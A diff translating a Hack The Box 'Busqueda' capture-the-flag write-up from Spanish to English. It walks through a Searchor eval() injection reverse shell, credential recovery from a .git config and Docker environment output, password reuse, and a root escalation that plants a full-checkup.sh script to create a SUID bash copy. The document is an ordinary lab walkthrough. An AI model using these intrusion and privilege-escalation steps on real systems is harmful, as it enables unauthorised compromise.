@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Busqueda - Hack The Box
-excerpt: Busqueda es una máquina de dificultad fácil de Hack The Box donde se obtiene acceso inicial a través de una ejecución arbitraria de código en una aplicación web vulnerable. La escalada de privilegios se logra accediendo a Gitea, analizando el código de un script ejecutable como root y abusando de permisos para establecer la bash con SUID.
+excerpt: Busqueda is an easy Hack The Box machine where initial access is obtained through arbitrary code execution in a vulnerable web application. Privilege escalation is achieved by accessing Gitea, analyzing the source of a script executable as root and abusing file permissions to set bash with the SUID bit.
 date: 2025-02-06
 classes: wide
 header:
@@ -17,7 +17,7 @@ tags:
   - SUID
 ---
 
-Este artículo detalla los pasos seguidos para resolver la máquina Búsqueda de Hack The Box. Es un desafío de dificultad fácil centrado en la explotación de aplicaciones web. Se comienza accediendo a la aplicación web mediante una ejecución arbitraria de código aprovechando una vulnerabilidad en un repositorio de GitHub. A partir de ahí, se obtienen credenciales que permiten el acceso a Gitea, donde se revisa el código fuente de un script que el usuario puede ejecutar con privilegios de root. Analizando su funcionamiento, se abusa de los permisos del sistema creando un archivo malicioso que modifica los permisos de la bash y la establece como SUID. Finalmente, se ejecuta la bash con privilegios elevados, logrando así el acceso completo al sistema.
+This article documents the steps taken to solve the Busqueda machine from Hack The Box. It's an easy box focused on web application exploitation. Initial access is obtained against the web application by leveraging an arbitrary code execution flaw discovered through a public GitHub repository. From there, credentials are recovered that grant access to Gitea, where the source of a script that the user can run with root privileges is reviewed. Analyzing its behavior, file system permissions are abused by creating a malicious file that modifies bash permissions and sets the SUID bit. Finally, bash is executed with elevated privileges, achieving full compromise of the system.
 
 ### Tools/Blogs used
 
@@ -27,7 +27,7 @@ Este artículo detalla los pasos seguidos para resolver la máquina Búsqueda de
 
 # Recon
 
-El primer paso será utilizar nmap para ver los puertos abiertos de la máquina. `nmap` encuentra varios puertos TCP abiertos:
+The first step is running nmap to enumerate the open ports on the machine. `nmap` finds several open TCP ports:
 
 ```
 PORT   STATE SERVICE VERSION
@@ -41,7 +41,7 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-El escaneo revela varios puertos TCP abiertos, lo que nos da una primera idea de la superficie de ataque disponible. El puerto 80/tcp se encuentra abierto y expone un servidor Apache 2.4.52. El escaneo indica que el sitio web redirige a http://searcher.htb/, por lo que será necesario añadir este dominio al archivo /etc/hosts para poder acceder correctamente a la aplicación web.
+The scan reveals several open TCP ports, giving a first look at the available attack surface. Port 80/tcp is open and exposes an Apache 2.4.52 server. The scan indicates the site redirects to http://searcher.htb/, so this domain needs to be added to /etc/hosts to access the web application correctly.
 
 ```
 └─$ nano /etc/hosts
@@ -49,27 +49,27 @@ El escaneo revela varios puertos TCP abiertos, lo que nos da una primera idea de
 10.10.11.208  searcher.htb
 ```
 
-Dado que se trata de una máquina Linux y que el servicio HTTP está disponible, el siguiente paso será analizar la aplicación web en busca de vulnerabilidades que nos permitan obtener acceso inicial al sistema.
+Since this is a Linux machine and HTTP is exposed, the next step is to analyze the web application looking for vulnerabilities that allow initial access to the system.
 
-# Enumeración
+# Enumeration
 
-En primer lugar, se realizan tareas de enumeración de directorios y subdominios, pero no se obtiene información relevante que permita avanzar por esta vía.
+First, directory and subdomain enumeration is performed, but nothing relevant comes out of it.
 
-Al analizar manualmente la página web, se observa en la parte inferior un banner con el siguiente mensaje:
+Inspecting the page manually, a banner at the bottom shows the following message:
 
 ![](/assets/images/htb-writeup-busqueda/web.png)
 
-Esto resulta especialmente interesante, ya que al investigar esta versión de Searchor se encuentra que es vulnerable a una ejecución remota de comandos (RCE). La vulnerabilidad de Searchor 2.4.0 se debe al uso inseguro de la función eval() en el backend de la aplicación. La web construye dinámicamente una cadena de código Python utilizando parámetros controlados por el usuario y la ejecuta directamente sin ningún tipo de validación. Esto permite a un atacante inyectar código Python arbitrario y lograr una ejecución remota de comandos (RCE) en el sistema.
+This is particularly interesting — investigating this version of Searchor shows it is vulnerable to remote code execution (RCE). The Searchor 2.4.0 vulnerability is caused by the unsafe use of `eval()` in the application backend. The web app dynamically builds a Python code string from user-controlled parameters and runs it directly without any validation, allowing an attacker to inject arbitrary Python and achieve RCE on the system.
 
-# Explotación
+# Exploitation
 
-Para explotar esta vulnerabilidad, se aprovecha el campo de búsqueda de la aplicación web. El parámetro introducido por el usuario se pasa directamente a eval(), por lo que es posible inyectar funciones de Python que ejecuten comandos del sistema operativo.
+To exploit this vulnerability, the search field of the web application is abused. The user-supplied parameter is passed straight to `eval()`, so it's possible to inject Python functions that execute operating-system commands.
 
-Se ha utilizado el exploit público disponible en GitHub ([Searchor 2.4.0 Arbitrary Command Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)), el cual automatiza la inyección de código aprovechando el uso inseguro de la función eval() en Searchor 2.4.0.
+A public exploit available on GitHub is used ([Searchor 2.4.0 Arbitrary Command Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)), which automates the code injection abusing the unsafe `eval()` call in Searchor 2.4.0.
 
-El script envía un payload malicioso a la funcionalidad de búsqueda de la aplicación web, logrando ejecutar comandos arbitrarios en el sistema objetivo con los privilegios del usuario que ejecuta la aplicación.
+The script sends a malicious payload to the search functionality of the web application, executing arbitrary commands on the target with the privileges of the user running the application.
 
-Antes de ejecutar el script debemos ponernos en escucha por el puerto 4444 usando netcat, para recibir la reverse shell de la máquina víctima:
+Before running the script, set up a netcat listener on port 4444 to receive the reverse shell from the victim machine:
 
 ```
 └─$ nc -nlvp 4444
@@ -96,13 +96,13 @@ svc@busqueda:/home/svc$ cat user.txt
 2ac1b522************************
 ```
 
-# Escalada de privilegios
+# Privilege escalation
 
-## Enumeración
+## Enumeration
 
-Una vez obtenido acceso al sistema, se comienza con la enumeración local. Al revisar el directorio /home, se observa que svc es el único usuario que dispone de un directorio personal.
+Once shell access is obtained, local enumeration begins. Reviewing /home shows that `svc` is the only user with a home directory.
 
-El contenido del directorio es bastante limitado, pero el archivo .gitconfig resulta especialmente interesante:
+The directory content is fairly limited, but the `.gitconfig` file stands out:
 
 ```
 svc@busqueda:~$ cat .gitconfig 
@@ -113,9 +113,9 @@ svc@busqueda:~$ cat .gitconfig
         hooksPath = no-hooks
 ```
 
-De este archivo se deduce que el usuario svc está asociado al usuario cody, lo que nos da una primera pista sobre posibles credenciales reutilizadas.
+From this file we can infer that the `svc` user is associated with the `cody` user — a first hint about possible password reuse.
 
-Continuando con la enumeración, se localiza el código de la aplicación web en el directorio /var/www/app:
+Continuing the enumeration, the web application code is located at /var/www/app:
 
 ```
 svc@busqueda:/var/www/app$ ls -la
@@ -127,7 +127,7 @@ drwxr-xr-x 8 www-data www-data 4096 Apr  8 19:00 .git
 drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
 ```
 
-La presencia del directorio .git indica que la aplicación está siendo gestionada mediante Git, lo cual puede revelar información sensible. Al revisar el archivo de configuración del repositorio, se encuentran credenciales en texto claro:
+The presence of the `.git` directory means the application is tracked with Git, which often leaks sensitive information. Reading the repo config exposes credentials in clear text:
 
 ```
 svc@busqueda:/var/www/app$ cat .git/config 
@@ -144,9 +144,9 @@ svc@busqueda:/var/www/app$ cat .git/config
         merge = refs/heads/main
 ```
 
-Aquí se identifica un repositorio alojado en Gitea junto con credenciales válidas para el usuario cody, lo que abre un nuevo vector de ataque.
+A Gitea-hosted repository is identified along with valid credentials for the `cody` user, opening a new attack vector.
 
-Para poder acceder al servicio, se añade el dominio gitea.searcher.htb al archivo /etc/hosts y se procede a acceder a la plataforma Gitea utilizando las credenciales obtenidas.
+To access the service, add `gitea.searcher.htb` to /etc/hosts and authenticate to the Gitea platform with the recovered credentials.
 
 ```
 └─$ nano /etc/hosts
@@ -156,22 +156,22 @@ Para poder acceder al servicio, se añade el dominio gitea.searcher.htb al archi
 
 ![](/assets/images/htb-writeup-busqueda/gitea.png)
 
-Se trata de una instancia de Gitea, y las credenciales del usuario cody funcionan correctamente, permitiendo el acceso a la plataforma sin problemas.
+It's a Gitea instance, and `cody`'s credentials work, granting access to the platform.
 
-Una vez dentro, se revisa el repositorio correspondiente al código de la aplicación web. Aunque el código fuente del sitio se encuentra disponible, no se identifica nada especialmente relevante o vulnerable que pueda aprovecharse en este punto.
+Once inside, the repository corresponding to the web application code is reviewed. Although the source is available, nothing particularly relevant or exploitable is identified at this point.
 
-Por lo tanto, se continúa con la enumeración en busca de otros posibles vectores que permitan avanzar en la escalada de privilegios.
+Enumeration therefore continues, looking for other vectors that allow advancing the privilege escalation.
 
 ### sudo
 
-Al comprobar los privilegios de sudo, se solicita la contraseña del usuario svc:
+Checking sudo privileges asks for the `svc` user password:
 
 ```
 svc@busqueda:~$ sudo -l
 [sudo] password for svc:
 ```
 
-Sabiendo que el usuario svc corresponde realmente a cody, se prueba reutilizar la contraseña obtenida previamente de Gitea, la cual resulta ser válida.
+Knowing that `svc` really corresponds to `cody`, the password previously recovered from Gitea is reused — and it works.
 
 ```
 svc@busqueda:~$ sudo -l
@@ -185,13 +185,13 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-El resultado muestra que el usuario svc puede ejecutar el siguiente comando con privilegios de root:
+The output shows that `svc` can run the following command with root privileges:
 
 ```
 (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-Esto indica que se permite ejecutar un script de Python como root, lo cual resulta muy prometedor para la escalada de privilegios. Sin embargo, al comprobar los permisos del archivo, se observa que svc no tiene permisos de lectura, e incluso tampoco puede ejecutarlo directamente.
+This means a Python script can be run as root, which is promising for privilege escalation. However, checking the file permissions shows that `svc` has no read access and cannot even execute it directly.
 
 ```
 svc@busqueda:~$ ls -l /opt/scripts/system-checkup.py 
@@ -200,14 +200,14 @@ svc@busqueda:~$ ls -l /opt/scripts/system-checkup.py
 
 ### system-checkup
 
-Debido al uso del (*) al final de la línea de sudo, no es posible ejecutar el script sin pasarle argumentos.
+Because of the `*` at the end of the sudo line, the script can't be run without arguments.
 
 ```
 svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 
 Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
 ```
 
-Al proporcionar un argumento cualquiera, el script se ejecuta correctamente y muestra un mensaje de ayuda con las opciones disponibles.
+Passing any argument lets the script run, and it prints a help message with the available options.
 
 ```
 svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 0xdf
@@ -218,7 +218,7 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup   : Run a full system checkup
 ```
 
-El script dispone de tres funcionalidades principales. La opción docker-ps muestra los contenedores Docker en ejecución en el sistema
+The script has three main features. The `docker-ps` option lists the running Docker containers on the system:
 
 ```
 svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
@@ -227,11 +227,11 @@ CONTAINER ID   IMAGE                COMMAND                  CREATED        STAT
 f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
 ```
 
-La salida confirma que hay dos contenedores activos, uno correspondiente a Gitea y otro a MySQL.
+The output confirms two active containers — one for Gitea and one for MySQL.
 
-La opción docker-inspect resulta especialmente interesante, ya que permite inspeccionar un contenedor concreto y acepta un parámetro de formato. Esta funcionalidad actúa como un wrapper del comando docker inspect, permitiendo al usuario controlar el parámetro --format.
+The `docker-inspect` option is particularly interesting. It lets you inspect a given container and accepts a format parameter, acting as a wrapper around `docker inspect` and letting the user control `--format`.
 
-Aprovechando esta característica, se utiliza el formato {{json .}} para mostrar toda la información del contenedor en formato JSON y facilitar su lectura mediante jq:
+Abusing this, the `{{json .}}` format is used to dump the full container info as JSON, then piped through `jq` for readability:
 
 ```
 svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
@@ -259,31 +259,31 @@ svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{js
 ...[snip]...
 ```
 
-Entre la información mostrada, destaca la sección Env, donde se encuentran variables de entorno sensibles utilizadas por el contenedor de Gitea. En ellas se incluyen las credenciales de conexión a la base de datos MySQL, incluyendo la contraseña.
+The `Env` section stands out — sensitive environment variables used by the Gitea container are exposed there, including the MySQL database connection credentials and password.
 
-Dado que es habitual la reutilización de contraseñas, se prueba dicha contraseña con otros usuarios. En este caso, se intenta reutilizarla para el usuario administrador de Gitea, logrando iniciar sesión correctamente en la plataforma.
+Since password reuse is common, that password is tested against other users. In this case it's reused against the Gitea administrator user — and works, granting admin access to the platform.
 
 ## system-checkup.py
 
-### Acceso como Administrador a gitea
+### Administrator access to Gitea
 
-Este acceso con privilegios elevados dentro de Gitea permite revisar repositorios adicionales y configuraciones internas, lo que resulta clave para avanzar en la escalada de privilegios y, finalmente, comprometer completamente el sistema.
+Privileged access to Gitea allows reviewing additional repositories and internal configurations, which is key to advancing the privilege escalation and ultimately compromising the system.
 
 ![](/assets/images/htb-writeup-busqueda/gitea2.png)
 
-Una vez dentro como administrador, se observa la existencia de un único repositorio privado denominado scripts. Al acceder a dicho repositorio, se localiza el archivo system-checkup.py, el mismo script que previamente se podía ejecutar con privilegios de root mediante sudo.
+Once in as administrator, there's a single private repository called `scripts`. Inside, the file `system-checkup.py` is located — the same script that could previously be executed with root via sudo.
 
-Esto permite analizar directamente el código del script y entender su funcionamiento interno, lo que será clave para abusar de su lógica y lograr la escalada final de privilegios.
+This means the script source can be read directly, exposing its internal behavior — the key to abusing its logic and reaching the final privilege escalation.
 
 ![](/assets/images/htb-writeup-busqueda/gitea3.png)
 
-### Analisis de system-checkup.py
+### system-checkup.py analysis
 
-Tras acceder al repositorio privado scripts como administrador de Gitea, se puede analizar el contenido del archivo system-checkup.py. El script es relativamente sencillo y está dividido en tres secciones, las cuales se ejecutan en función del argumento proporcionado.
+After accessing the private `scripts` repo as Gitea administrator, the contents of `system-checkup.py` can be reviewed. The script is fairly simple, split into three branches that run depending on the supplied argument.
 
-Las funciones docker-ps y docker-inspect utilizan una función interna llamada run_command, que hace uso de subprocess.run() de forma segura, por lo que no es posible inyectar comandos a través de estas opciones.
+The `docker-ps` and `docker-inspect` branches use an internal helper called `run_command` that wraps `subprocess.run()` safely, so command injection through those options is not possible.
 
-Sin embargo, la opción full-checkup resulta especialmente interesante:
+The `full-checkup` branch, however, is interesting:
 
 ```
 elif action == 'full-checkup':
@@ -296,11 +296,11 @@ elif action == 'full-checkup':
         exit(1)
 ```
 
-En este caso, el script intenta ejecutar el archivo full-checkup.sh desde el directorio actual. Anteriormente esta opción fallaba porque dicho archivo no existía. No obstante, esto permite un abuso claro: si se crea un archivo full-checkup.sh en el directorio desde el cual se ejecuta el script, este se ejecutará automáticamente con privilegios de root.
+Here the script tries to execute `full-checkup.sh` from the current working directory. Previously this option failed because the file didn't exist — but that gives a clear abuse: if a `full-checkup.sh` file is created in the directory from which the script is launched, it will be executed automatically as root.
 
-### Explotación
+### Exploitation
 
-Aprovechando este comportamiento, se crea un script malicioso que copia la bash del sistema y establece el bit SUID, permitiendo ejecutar una shell con privilegios elevados.
+Abusing this behavior, a malicious script is created that copies the system `bash` and sets the SUID bit, allowing a shell to be executed with elevated privileges.
 
 ```
 svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/hack\nchmod 4777 /tmp/hack' > full-checkup.sh
@@ -311,9 +311,9 @@ cp /bin/bash /tmp/hack
 chmod 4777 /tmp/hack
 ```
 
-Es importante marcar el archivo como ejecutable para que pueda ser lanzado correctamente por el script.
+The file must be marked as executable so the script can launch it correctly.
 
-A continuación, se ejecuta nuevamente system-checkup.py con la opción full-checkup:
+Then `system-checkup.py` is run again with the `full-checkup` option:
 
 ```
 svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
@@ -321,20 +321,20 @@ svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
 [+] Done!
 ```
 
-Tras la ejecución, se comprueba que el archivo /tmp/hack ha sido creado, pertenece a root y tiene el bit SUID activado:
+After execution, `/tmp/hack` has been created, owned by root and with the SUID bit set:
 
 ```
 svc@busqueda:/tmp$ ls -l /tmp/hack 
 -rwsrwxrwx 1 root root 1396520 Feb 06 19:57 /tmp/hack
 ```
 
-Finalmente, se ejecuta la bash con el parámetro -p para evitar la pérdida de privilegios:
+Finally, bash is run with the `-p` flag to keep the elevated privileges:
 
 ```
 svc@busqueda:/tmp$ /tmp/hack -p
 ```
 
-Con esto, se obtiene una shell como root, permitiendo acceder al archivo root.txt y completar el compromiso total de la máquina:
+This drops a root shell, allowing access to `root.txt` and full compromise of the machine:
 
 ```
 root@busqueda:/# cat root.txt
